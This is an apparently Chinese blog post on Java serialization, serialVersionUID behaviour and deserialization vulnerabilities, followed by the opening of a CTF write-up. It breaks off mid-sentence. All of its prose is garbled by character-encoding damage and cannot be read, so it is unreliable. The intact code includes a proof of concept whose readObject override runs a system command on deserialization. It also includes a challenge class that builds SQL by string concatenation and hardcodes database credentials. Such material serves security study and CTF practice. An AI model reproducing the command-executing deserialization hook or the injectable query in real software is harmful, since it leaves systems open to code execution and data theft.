è¯»å…¥åˆ°è¾“å…¥æµä¸­ï¼›</p><p>å†è¿è¡Œä¸€æ¬¡æµ‹è¯•äº†ç±»ï¼Œä½ ä¼šå‘ç°å¯¹è±¡å¯ä»¥æ­£å¸¸åœ°åºåˆ—åŒ–å’Œååºåˆ—åŒ–äº†ã€‚</p><blockquote><p>åºåˆ—åŒ–å‰ï¼šWanger{name&#x3D;ç‹äºŒ,age&#x3D;18}<br>åºåˆ—åŒ–åï¼šWanger{name&#x3D;ç‹äºŒ,age&#x3D;18}</p></blockquote><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><p>Externalizable å’Œ Serializable éƒ½æ˜¯ç”¨äºå®ç° Java å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ¥å£ï¼Œä½†æ˜¯å®ƒä»¬æœ‰ä»¥ä¸‹åŒºåˆ«ï¼š</p><p>â‘ ã€Serializable æ˜¯ Java æ ‡å‡†åº“æä¾›çš„æ¥å£ï¼Œè€Œ Externalizable æ˜¯ Serializable çš„å­æ¥å£ï¼›<br><img src="https://cdn.tobebetterjavaer.com/stutymore/Serializbale-20230323161831.png"></p><p>â‘¡ã€Serializable æ¥å£ä¸éœ€è¦å®ç°ä»»ä½•æ–¹æ³•ï¼Œåªéœ€è¦å°†éœ€è¦åºåˆ—åŒ–çš„ç±»æ ‡è®°ä¸º Serializable å³å¯ï¼Œè€Œ Externalizable æ¥å£éœ€è¦å®ç° writeExternal å’Œ readExternal ä¸¤ä¸ªæ–¹æ³•ï¼›<br>â‘¢ã€Externalizable æ¥å£æä¾›äº†æ›´é«˜çš„åºåˆ—åŒ–æ§åˆ¶èƒ½åŠ›ï¼Œå¯ä»¥åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹å¯¹è±¡è¿›è¡Œè‡ªå®šä¹‰çš„å¤„ç†ï¼Œå¦‚å¯¹ä¸€äº›æ•æ„Ÿä¿¡æ¯è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ã€‚</p><h3 id="05ã€å†æ¥ç‚¹ç”œç‚¹"><a href="#05ã€å†æ¥ç‚¹ç”œç‚¹" class="headerlink" title="05ã€å†æ¥ç‚¹ç”œç‚¹"></a>05ã€å†æ¥ç‚¹ç”œç‚¹</h3><p>è®©æˆ‘å…ˆé—®é—®ä½ å§ï¼Œä½ çŸ¥é“ <code> private static final long serialVersionUID = -2095916884810199532L;</code> è¿™æ®µä»£ç çš„ä½œç”¨å—ï¼Ÿ</p><p>å—¯â€¦â€¦</p><p><code>serialVersionUID</code> è¢«ç§°ä¸ºåºåˆ—åŒ– IDï¼Œå®ƒæ˜¯å†³å®š Java å¯¹è±¡èƒ½å¦ååºåˆ—åŒ–æˆåŠŸçš„é‡è¦å› å­ã€‚åœ¨ååºåˆ—åŒ–æ—¶ï¼ŒJava è™šæ‹Ÿæœºä¼šæŠŠå­—èŠ‚æµä¸­çš„ <code>serialVersionUID</code> ä¸è¢«åºåˆ—åŒ–ç±»ä¸­çš„ <code>serialVersionUID</code> è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒåˆ™å¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦åˆ™å°±ä¼šæŠ›å‡ºåºåˆ—åŒ–ç‰ˆæœ¬ä¸ä¸€è‡´çš„å¼‚å¸¸ã€‚</p><p>å½“ä¸€ä¸ªç±»å®ç°äº† <code>Serializable</code> æ¥å£åï¼ŒIDE å°±ä¼šæé†’è¯¥ç±»æœ€å¥½äº§ç”Ÿä¸€ä¸ªåºåˆ—åŒ– IDï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š</p><p><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-4.png"></p><p>1ï¼‰æ·»åŠ ä¸€ä¸ªé»˜è®¤ç‰ˆæœ¬çš„åºåˆ—åŒ– IDï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>ã€‚</span><br></pre></td></tr></table></figure><p>2ï¼‰æ·»åŠ ä¸€ä¸ªéšæœºç”Ÿæˆçš„ä¸é‡å¤çš„åºåˆ—åŒ– IDã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2095916884810199532L</span>;</span><br></pre></td></tr></table></figure><p>3ï¼‰æ·»åŠ  <code>@SuppressWarnings</code> æ³¨è§£ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br></pre></td></tr></table></figure><p>æ€ä¹ˆé€‰æ‹©å‘¢ï¼Ÿ</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§åŠæ³•ï¼Œåœ¨è¢«åºåˆ—åŒ–ç±»ä¸­æ·»åŠ ä¸€ä¸ªéšæœºç”Ÿæˆçš„åºåˆ—åŒ– IDã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2095916884810199532L</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¶ä»–ä»£ç å¿½ç•¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œåºåˆ—åŒ–ä¸€ä¸ª <code>Wanger</code> å¯¹è±¡åˆ°æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Wanger</span>();</span><br><span class="line">wanger.setName(<span class="string">&quot;ç‹äºŒ&quot;</span>);</span><br><span class="line">wanger.setAge(<span class="number">18</span>);</span><br><span class="line">System.out.println(wanger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠŠå¯¹è±¡å†™åˆ°æ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;chenmo&quot;</span>));) &#123;</span><br><span class="line">oos.writeObject(wanger);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬æ‚„æ‚„åœ°æŠŠ <code>Wanger</code> ç±»çš„åºåˆ—åŒ– ID å·æ¢æ¢æŸ±ä¸€ä¸‹ï¼Œå˜¿å˜¿ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// private static final long serialVersionUID = -2095916884810199532L;</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2095916884810199533L</span>;</span><br></pre></td></tr></table></figure><p>å¥½äº†ï¼Œå‡†å¤‡ååºåˆ—åŒ–å§ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;chenmo&quot;</span>)));) &#123;</span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger</span> <span class="operator">=</span> (Wanger) ois.readObject();</span><br><span class="line">System.out.println(wanger);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å“å‘€ï¼Œå‡ºé”™äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException:  local class incompatible: stream classdesc </span><br><span class="line">serialVersionUID = -2095916884810199532,</span><br><span class="line">local class serialVersionUID = -2095916884810199533</span><br><span class="line">at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)</span><br><span class="line">at com.cmower.java_demo.xuliehua1.Test.main(Test.java:27)</span><br></pre></td></tr></table></figure><p>å¼‚å¸¸å †æ ˆä¿¡æ¯é‡Œé¢å‘Šè¯‰æˆ‘ä»¬ï¼Œä»æŒä¹…åŒ–æ–‡ä»¶é‡Œé¢è¯»å–åˆ°çš„åºåˆ—åŒ– ID å’Œæœ¬åœ°çš„åºåˆ—åŒ– ID ä¸ä¸€è‡´ï¼Œæ— æ³•ååºåˆ—åŒ–ã€‚</p><p>é‚£å‡å¦‚æˆ‘ä»¬é‡‡ç”¨ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œä¸º <code>Wanger</code> ç±»æ·»åŠ ä¸ª <code>@SuppressWarnings(&quot;serial&quot;)</code> æ³¨è§£å‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="comment">// çœç•¥å…¶ä»–ä»£ç </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¥½äº†ï¼Œå†æ¥ä¸€æ¬¡ååºåˆ—åŒ–å§ã€‚å¯æƒœä¾ç„¶æŠ¥é”™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException:  local class incompatible: stream classdesc </span><br><span class="line">serialVersionUID = -2095916884810199532, </span><br><span class="line">local class serialVersionUID = -3818877437117647968</span><br><span class="line">at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)</span><br><span class="line">at com.cmower.java_demo.xuliehua1.Test.main(Test.java:27)</span><br></pre></td></tr></table></figure><p>å¼‚å¸¸å †æ ˆä¿¡æ¯é‡Œé¢å‘Šè¯‰æˆ‘ä»¬ï¼Œæœ¬åœ°çš„åºåˆ—åŒ– ID ä¸º -3818877437117647968ï¼Œå’ŒæŒä¹…åŒ–æ–‡ä»¶é‡Œé¢è¯»å–åˆ°çš„åºåˆ—åŒ– ID ä»ç„¶ä¸ä¸€è‡´ï¼Œæ— æ³•ååºåˆ—åŒ–ã€‚è¿™è¯´æ˜ä»€ä¹ˆå‘¢ï¼Ÿä½¿ç”¨ <code>@SuppressWarnings(&quot;serial&quot;)</code> æ³¨è§£æ—¶ï¼Œè¯¥æ³¨è§£ä¼šä¸ºè¢«åºåˆ—åŒ–ç±»è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªéšæœºçš„åºåˆ—åŒ– IDã€‚</p><p>ç”±æ­¤å¯ä»¥è¯æ˜ï¼Œ<strong>Java è™šæ‹Ÿæœºæ˜¯å¦å…è®¸ååºåˆ—åŒ–ï¼Œä¸ä»…å–å†³äºç±»è·¯å¾„å’ŒåŠŸèƒ½ä»£ç æ˜¯å¦ä¸€è‡´ï¼Œè¿˜æœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„å› ç´ å°±æ˜¯åºåˆ—åŒ– ID æ˜¯å¦ä¸€è‡´</strong>ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œé‡‡ç”¨é»˜è®¤çš„åºåˆ—åŒ– IDï¼ˆ1Lï¼‰å°±å¯ä»¥ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿ä»£ç ä¸€è‡´æ—¶ååºåˆ—åŒ–æˆåŠŸã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"><span class="comment">// çœç•¥å…¶ä»–ä»£ç </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´ç»†èŠ‚"><a href="#æ¼æ´ç»†èŠ‚" class="headerlink" title="æ¼æ´ç»†èŠ‚"></a>æ¼æ´ç»†èŠ‚</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//é‡å†™readObject()æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="comment">//æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³•</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//æ‰§è¡Œæ‰“å¼€è®¡ç®—å™¨ç¨‹åºå‘½ä»¤</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//å®šä¹‰myObjå¯¹è±¡</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸€ä¸ªåŒ…å«å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ä¿¡æ¯çš„â€objectâ€æ•°æ®æ–‡ä»¶</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        <span class="comment">//writeObject()æ–¹æ³•å°†myObjå¯¹è±¡å†™å…¥objectæ–‡ä»¶</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//æ¢å¤å¯¹è±¡</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šé¢ä»£ç æ‰€ç¤ºï¼Œç”µè„‘ä¼šå¼¹å‡ºè®¡ç®—å™¨</p><h1 id="CTFé¢˜ç›®"><a href="#CTFé¢˜ç›®" class="headerlink" title="CTFé¢˜ç›®"></a>CTFé¢˜ç›®</h1><p><a href="https://xz.aliyun.com/t/13279?time__1311=GqmxuD0DnAitKGNeeeqBK40KbqWqyGrEbD">https://xz.aliyun.com/t/13279?time__1311=GqmxuD0DnAitKGNeeeqBK40KbqWqyGrEbD</a></p><h2 id="ç½‘é¼æ¯2020æœ±é›€ç»„-ThinkJava"><a href="#ç½‘é¼æ¯2020æœ±é›€ç»„-ThinkJava" class="headerlink" title="[ç½‘é¼æ¯2020æœ±é›€ç»„]ThinkJava"></a>[ç½‘é¼æ¯2020æœ±é›€ç»„]ThinkJava</h2><p><a href="https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html">https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html</a><br><a href="https://c.biancheng.net/view/5532.html">https://c.biancheng.net/view/5532.html</a><br><a href="https://www.cnblogs.com/h3zh1/p/12914439.html">https://www.cnblogs.com/h3zh1/p/12914439.html</a></p><p>è¿™é“é¢˜å¼€å§‹æ‹¿åˆ°çš„æœ‰ä¸ªurlï¼Œè®¿é—®æ—¶æ˜¾ç¤ºæ²¡æœ‰æƒé™ï¼Œæš‚æ—¶æ²¡æœ‰çªç ´ç‚¹ï¼Œè¿˜æœ‰ä¸ªclasså‹ç¼©åŒ…ï¼Œå…¶ä¸­æœ‰ä¸€äº›ä»£ç ï¼Œæ‰“å¼€åå‘ç°æœ‰ç›¸å…³çš„æ•°æ®åº“æ“ä½œç±»ï¼Œå…¶ä¸­æœ‰ä¸ªswaggerï¼Œæƒ³åˆ°swaggerçš„æœªæˆæƒè®¿é—®ï¼Œè¿™é‡Œç”¨æ›¾å“¥çš„è„šæœ¬æ‰«æä¸‹<br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image.png"><br><a href="https://github.com/AabyssZG/SpringBoot-Scan">https://github.com/AabyssZG/SpringBoot-Scan</a><br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-1.png"><br>è®¿é—®é¡µé¢å‘ç°æœ‰swaggeræ¥å£æµ‹è¯•çš„å£å­<br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-2.png"><br>è§‚å¯Ÿå‘ç°sqlDictï¼Œå¯¹åº”ä¸‹è½½ä¸‹æ¥çš„ä»£ç ä¸­sqlDictç±»ï¼Œè¿™ä¸ªç±»çš„æ–¹æ³•<code>getTableData</code>å­˜åœ¨sqlæ³¨å…¥çš„å¯èƒ½æ€§<br>åˆ†æä¸‹è½½çš„sqlDictä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDict</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlDict</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (dbName != <span class="literal">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                user = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pass == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                pass = <span class="string">&quot;abc@12345&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">            var6.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title function_">getTableData</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        List&lt;Table&gt; Tables = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getConnection(dbName, user, pass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">TableName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">DatabaseMetaData</span> <span class="variable">metaData</span> <span class="operator">=</span> conn.getMetaData();</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">tableNames</span> <span class="operator">=</span> metaData.getTables((String)<span class="literal">null</span>, (String)<span class="literal">null</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;TABLE&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">                TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">                <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">                <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">                    table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                table.setTableName(TableName);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">data</span> <span class="operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="literal">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs2</span> <span class="operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="literal">null</span>, TableName);</span><br><span class="line"></span><br><span class="line">                String PK;</span><br><span class="line">                <span class="keyword">for</span>(PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(data.next()) &#123;</span><br><span class="line">                    <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Row</span>(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="literal">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">                    table.list.add(row);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Tables.add(table);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">            var16.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tables;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç 